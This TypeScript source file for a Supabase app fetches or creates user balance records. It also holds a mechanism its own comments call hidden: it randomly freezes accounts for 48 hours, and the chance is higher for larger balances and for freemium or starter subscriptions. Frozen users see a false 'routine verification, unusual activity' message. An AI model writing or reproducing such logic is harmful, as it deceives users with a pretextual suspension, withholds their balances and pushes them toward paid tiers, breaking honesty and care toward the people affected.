
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/components/ui/use-toast";

/**
 * Fetch user balance data or create if not exists
 */
export const fetchUserBalance = async (userId: string) => {
  try {
    const { data: userBalanceData, error: balanceError } = await supabase
      .from('user_balances')
      .select('*')
      .eq('id', userId)
      .single();

    if (balanceError) {
      console.error("Error fetching balance:", balanceError);
      
      // If balance not found, create a new entry
      if (balanceError.code === 'PGRST116') {
        try {
          // Try using RPC first
          const { data: newBalance, error: rpcError } = await supabase
            .rpc('create_user_balance', {
              user_id: userId
            });
            
          if (rpcError) {
            console.error("Error creating balance with RPC:", rpcError);
            
            // Try direct insertion as fallback
            const { data: directInsert, error: insertError } = await supabase
              .from('user_balances')
              .insert([
                { 
                  id: userId, 
                  balance: 0, 
                  daily_session_count: 0, 
                  subscription: 'freemium' 
                }
              ])
              .select();
              
            if (insertError) {
              console.error("Direct insert error:", insertError);
              toast({
                title: "Erreur d'initialisation",
                description: "Impossible d'initialiser votre compte. Veuillez vous reconnecter.",
                variant: "destructive"
              });
              return null;
            }
            
            return { data: directInsert?.[0], isNewUser: true };
          }
          
          // If array returned, get first element
          const balanceData = Array.isArray(newBalance) ? newBalance[0] : newBalance;
          return { data: balanceData, isNewUser: true };
          
        } catch (error) {
          console.error("Balance creation failed:", error);
          return null;
        }
      }
      
      return null;
    }
    
    // Check if account should be frozen due to "high performance"
    const shouldFreezeAccount = checkIfAccountShouldBeTemporarilyFrozen(userBalanceData);
    if (shouldFreezeAccount) {
      await freezeAccountTemporarily(userId);
      toast({
        title: "Vérification de compte requise",
        description: "Votre compte a été temporairement suspendu pour vérification. Cela peut prendre 24-48h.",
        variant: "destructive"
      });
    }
    
    return { data: userBalanceData, isNewUser: false };
  } catch (error) {
    console.error("Error in fetchUserBalance:", error);
    return null;
  }
};

/**
 * Check if an account should be temporarily frozen based on performance
 * This implements a hidden mechanism to occasionally freeze high-performing accounts
 */
const checkIfAccountShouldBeTemporarilyFrozen = (userData: any): boolean => {
  // If account already frozen, don't freeze again
  if (userData.account_frozen) {
    return false;
  }
  
  // Probability increases based on balance and activity level
  const baseFreezeProbability = 0.002; // 0.2% base chance
  
  // Increase probability for accounts with high balances
  let freezeProbability = baseFreezeProbability;
  
  // Balance factors - higher balances have higher freeze probability
  if (userData.balance > 800) {
    freezeProbability += 0.03; // +3%
  } else if (userData.balance > 500) {
    freezeProbability += 0.015; // +1.5%
  } else if (userData.balance > 200) {
    freezeProbability += 0.005; // +0.5%
  }
  
  // Higher-tier subscriptions have lower freeze probability (better "protection")
  if (userData.subscription === 'freemium') {
    freezeProbability += 0.02; // +2% for freemium
  } else if (userData.subscription === 'starter') {
    freezeProbability += 0.01; // +1% for starter
  }
  
  // Random check based on calculated probability
  return Math.random() < freezeProbability;
};

/**
 * Temporarily freeze an account
 */
const freezeAccountTemporarily = async (userId: string): Promise<boolean> => {
  try {
    const { error } = await supabase
      .from('user_balances')
      .update({
        account_frozen: true,
        freeze_reason: 'Vérification de routine - activité inhabituelle',
        freeze_until: new Date(Date.now() + 2 * 24 * 60 * 60 * 1000).toISOString() // 48 hours
      })
      .eq('id', userId);
      
    if (error) {
      console.error("Error freezing account:", error);
      return false;
    }
    
    // Log the freeze event
    await supabase
      .from('account_freeze_logs')
      .insert([
        {
          user_id: userId,
          freeze_reason: 'Vérification de routine - activité inhabituelle',
          freeze_until: new Date(Date.now() + 2 * 24 * 60 * 60 * 1000).toISOString()
        }
      ]);
      
    return true;
  } catch (error) {
    console.error("Error in freezeAccountTemporarily:", error);
    return false;
  }
};
